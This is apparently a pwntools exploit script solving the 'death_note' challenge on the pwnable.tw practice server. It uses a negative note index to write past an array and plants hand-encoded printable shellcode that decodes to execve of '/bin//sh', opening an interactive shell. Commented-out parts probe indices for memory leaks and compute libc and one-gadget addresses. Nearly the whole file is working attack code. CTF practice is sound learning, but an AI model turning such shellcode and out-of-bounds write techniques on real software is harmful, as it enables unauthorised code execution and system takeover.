from pwn import *
from icecream import ic

elf = exe = ELF("./death_note")
libc = elf.libc

context.binary = exe
context.log_level = "debug"
context.aslr = True
context.arch = 'i386'
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10201)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# b *0x080488eb
b *0x080487ef
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def addnote(ind, val):
    ru("Your choice :")
    sl(b'1')
    ru("Index :")
    sl(ind)
    ru("Name :")
    sl(val)

def shownote(ind):
    ru("Your choice :")
    sl(b'2')
    ru("Index :")
    sl(ind)

def delnote(ind):
    ru("Your choice :")
    sl(b'3')
    ru("Index :")
    sl(ind)

# free -19
# for i in range(100):
#     l = [7, 8, 11]
#     if i in l:
#         continue
#     p = ('-'+str(i)).encode()
#     shownote(p)
#     if rl() == b'-----------------------------------\n':
#         continue
#     else:
#         io.interactive()


# shownote(b'-11')
# ru("Name : ")
# leak = u32(re(4))
# ic(hex(leak))
# libc.address = leak - 0x38c40
# ic(hex(libc.address))
# oneshot = libc.address + 0xebc81
# ic(hex(oneshot))
# i can use asm('sub word ptr [eax+36], ax')
# payload = asm('inc eax')*16
payload = asm('''
push edx
pop esi
push 0x70707070
pop eax
push 0x60606060
pop ecx
sub byte ptr [esi+57], al
sub byte ptr [esi+69], al
sub byte ptr [esi+69], al
sub byte ptr [esi+70], al
sub byte ptr [esi+72], al
sub byte ptr [esi+73], cl
sub byte ptr [esi+73], cl
sub byte ptr [esi+74], cl
sub byte ptr [esi+75], al
sub byte ptr [esi+75], al
sub byte ptr [esi+76], al
sub byte ptr [esi+77], al
sub byte ptr [esi+78], al
sub byte ptr [esi+78], al
''')
# payload += b'1\x50Ph//shh/bin\x49\x511\x62\x40\x3b\x49\x43\x5d\x40'
payload += b'1\x30Ph//shh/bin\x69\x311\x42\x70\x6b\x69\x53\x3d\x60'
# payload += b'\x61\xf0\x80\x98\x5f\x5f\xa3\x98\x98\x5f\x92\x99\x9e\xb9\xf1\x61\x02\xe0\x3b\xb9\x13\xfd\xb0'
# ['0x61', '0xf0', '0x80', '0x98', '0x5f', '0x5f', '0xa3', '0x98', '0x98', '0x5f', '0x92', '0x99', '0x9e', '0xb9', '0xf1', '0x61', '0x102', '0xe0', '0x3b', '0xb9', '0x113', '0xfd', '0xb0']
# xor eax, eax
# push eax
# push 0x68732f2f
# push 0x6e69622f
# mov ecx, eax
# xor edx, edx
# mov al, 0xb
# mov ebx, esp
# int 0x80
addnote(b'-16', payload)

i()
